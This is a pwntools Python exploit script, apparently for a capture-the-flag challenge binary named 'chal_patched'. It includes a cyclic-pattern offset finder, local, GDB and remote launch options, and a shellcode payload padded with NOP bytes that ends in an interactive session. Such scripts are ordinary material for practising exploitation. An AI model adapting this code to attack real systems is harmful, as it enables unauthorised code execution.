from pwn import *
import sys
from ctypes import CDLL

context.terminal = "kitty"
context.gdbinit = "/opt/pwndbg/gdbinit"
context.log_level = "info"        # 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING'
binary = "./chal_patched"        ### CHANGE ME !!!!!!!!!!!!!!!!

    # b *main+202
gdbscript = '''
    b *main+471
'''

libcx = CDLL("libc.so.6")
# now = int(floor(time.time()))
# libcx.srand(now)
# print(libcx.rand())

def init():
    ## loading custom libc
    # env = {"LD_PRELOAD": "./desired_libc"}
    ## loading custom libc
    if (args.GDB):
        pp = gdb.debug(binary, gdbscript=gdbscript)
    elif (args.REMOTE):
        pp = remote(sys.argv[1], int(sys.argv[2]))
    else :
        pp = process(binary)# env=env)
    return pp

def findip(pp, length):
    cyclic_patt = cyclic(length)
    pp.recv()
    pp.sendline(cyclic_patt)
    pp.wait()
    # offset = cyclic_find(pp.core.pc)
    offset = cyclic_find(pp.corefile.read(pp.core.sp, 4))
    log.info(f"offset found {offset}")

def exploit():
    #offset = 
    log.info("binary loaded")
    pp.recvuntil(b"> ")
    pay = asm (
            "lgs gs, 0x1337000;"
            " call dword ptr gs:[0x80]"
               )
    pay += (4096 - len(pay)) * b"\x90"
    pp.sendline(pay)
    pp.interactive()

if (args.REMOTE):
    libc = ELF("./libc.so.6")
else:
    libc = ELF("/usr/lib/libc.so.6")
libcrops = ROP(libc)
elf = context.binary = ELF(binary)
pp = init()
exploit()
